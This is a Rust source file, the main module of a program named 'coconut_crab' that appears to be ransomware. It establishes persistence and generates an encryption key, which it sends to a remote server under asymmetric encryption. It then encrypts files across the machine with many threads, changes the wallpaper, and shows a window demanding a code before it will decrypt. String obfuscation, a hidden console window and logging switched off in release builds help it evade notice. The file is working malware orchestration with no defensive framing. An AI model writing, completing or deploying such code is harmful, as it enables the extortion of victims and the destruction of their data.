#![cfg_attr(
    all(target_os = "windows", not(debug_assertions)),
    windows_subsystem = "windows"
)]

use hex::encode;
use log::{debug, error, info};
use std::{path::Path, process::ExitCode, sync::Arc};
use zeroize::{Zeroize, Zeroizing};

use coconut_crab_lib::{file::get_exe_path_dir, web::codes::RECOVERY_REQUEST_CODE};

mod canary;
mod client;
use client::{get_thread_counts, initialize_client};

mod comm;
use comm::{
    ServerConn, download_asym_pub_key, get_sym_key, upload_sym_key, write_asym_pub_key_to_disk,
};

mod config;
mod crypto;
use crypto::{encrypt_string, encrypt_sym_key, generate_nonce, generate_sym_key};

mod decrypt;
use decrypt::{DecryptConfig, spawn_decryption_handler};

mod encrypt;
use encrypt::{EncryptionPipeline, run_encryption_pipeline};

mod img;
use img::set_icon_wallpaper;

mod persist;
use persist::start_persist;

mod status;
use status::{Status, export_status_csv};

mod shredder;

mod ui;
use ui::callback_handler_init;

mod walker;

#[macro_use]
extern crate litcrypt2;
extern crate alloc;
use_litcrypt!();

slint::include_modules!();

fn main() -> ExitCode {
    let level = if cfg!(debug_assertions) {
        log::LevelFilter::Info
    } else {
        log::LevelFilter::Off
    };
    env_logger::Builder::new().filter_level(level).init();

    match run() {
        Ok(()) => ExitCode::SUCCESS,
        Err(error) => {
            error!("Fatal error: {error}");
            ExitCode::FAILURE
        }
    }
}

fn run() -> Result<(), String> {
    let preshared_secret = config::PRESHARED_SECRET.as_str();
    let conn = ServerConn::from_config();

    if config::PERSIST {
        debug!("Establishing persistence");
        if let Err(error) = start_persist() {
            error!("Failed to establish persistence: {error}");
        }
    }

    let exe_path_dir = get_exe_path_dir()
        .map_err(|error| format!("Cannot determine executable directory: {error}"))?;
    let mut status = initialize_client(&exe_path_dir, &conn, preshared_secret)?;
    let thread_counts = get_thread_counts();

    let mut sym_key = Zeroizing::new([0u8; 32]);

    if !status.encryption_complete {
        setup_encryption_keys(
            &mut status,
            &mut sym_key,
            &exe_path_dir,
            &conn,
            preshared_secret,
        )?;
    }

    let sym_key_arc = Arc::new(Zeroizing::new(*sym_key));
    sym_key.zeroize();
    let encrypted_extension: Arc<str> = Arc::from(config::ENCRYPTED_EXTENSION.as_str());
    let exe_path_dir_arc = Arc::new(exe_path_dir);
    let aad_arc: Arc<[u8]> = Arc::from(status.encryption_aad.as_bytes());

    if !status.encryption_complete {
        run_encryption_pipeline(EncryptionPipeline {
            status: &mut status,
            sym_key: &sym_key_arc,
            exe_path_dir: &exe_path_dir_arc,
            thread_counts: &thread_counts,
            conn: &conn,
            preshared_secret,
            aad: &aad_arc,
        })?;
    }

    if config::SET_WALLPAPER {
        set_icon_wallpaper();
    }

    let ui = Main::new().expect("Failed to create Slint UI");
    callback_handler_init(&ui);

    let decrypt_requests = spawn_decryption_handler(
        &ui,
        DecryptConfig {
            status: status.clone(),
            conn: conn.clone(),
            preshared_secret: preshared_secret.to_string(),
            encrypted_extension: Arc::clone(&encrypted_extension),
            walk_threads: thread_counts.walk,
            decrypt_threads: thread_counts.decrypt,
            persist: config::PERSIST,
        },
    );

    let ui_handle = ui.as_weak();
    ui.on_try_decrypt(move || {
        let Some(ui) = ui_handle.upgrade() else {
            return;
        };

        let code = ui.get_code().to_string();
        info!("Verifying code");

        ui.set_status_text("Verifying code...".into());
        ui.set_status_progress(true);

        if decrypt_requests.try_send(code).is_err() {
            error!("Decryption handler busy or unavailable");
            ui.set_status_text("Decryption unavailable".into());
            ui.set_status_progress(false);
        }
    });

    ui.run().expect("Failed to run Slint UI");
    Ok(())
}

fn setup_encryption_keys(
    status: &mut Status,
    sym_key: &mut Zeroizing<[u8; 32]>,
    exe_path_dir: &Path,
    conn: &ServerConn,
    preshared_secret: &str,
) -> Result<(), String> {
    debug!("Encryption not previously completed");

    if status.encryption_started {
        debug!("Encryption previously started; retrieving key");
        let key = get_sym_key(conn, status, RECOVERY_REQUEST_CODE, preshared_secret)
            .map_err(|error| format!("Unable to retrieve symmetric key from server: {error}"))?;
        **sym_key = *key;
    } else {
        debug!("Encryption not previously started");
        **sym_key = generate_sym_key();

        let asym_pub_key = download_asym_pub_key(conn)
            .map_err(|error| format!("Unable to download public key: {error}"))?;

        if config::SAVE_PUBLIC_KEY_TO_DISK {
            write_asym_pub_key_to_disk(&asym_pub_key, &exe_path_dir.join("asym-pub-key.pem"))?;
        }

        status.asymmetrically_encrypted_symmetric_key =
            match encrypt_sym_key(&asym_pub_key, sym_key) {
                Ok(encrypted) => encode(encrypted),
                Err(error) => {
                    sym_key.zeroize();
                    let _ = export_status_csv(exe_path_dir, status);
                    return Err(format!("{error}; exiting without marking complete"));
                }
            };

        upload_sym_key(conn, status, preshared_secret).map_err(|error| {
            sym_key.zeroize();
            let _ = export_status_csv(exe_path_dir, status);
            format!("Failed to upload symmetric key: {error}")
        })?;

        let full_nonce_bytes = generate_nonce();
        status.symmetrically_encrypted_id_nonce = encode(full_nonce_bytes);
        let (id_ciphertext, id_tag) = encrypt_string(
            &status.id,
            sym_key,
            &full_nonce_bytes,
            status.encryption_aad.as_bytes(),
        );
        status.symmetrically_encrypted_id = encode(id_ciphertext);
        status.symmetrically_encrypted_id_tag = encode(id_tag);
    }

    export_status_csv(exe_path_dir, status)
        .map_err(|error| format!("Failed to update status CSV: {error}"))?;
    Ok(())
}
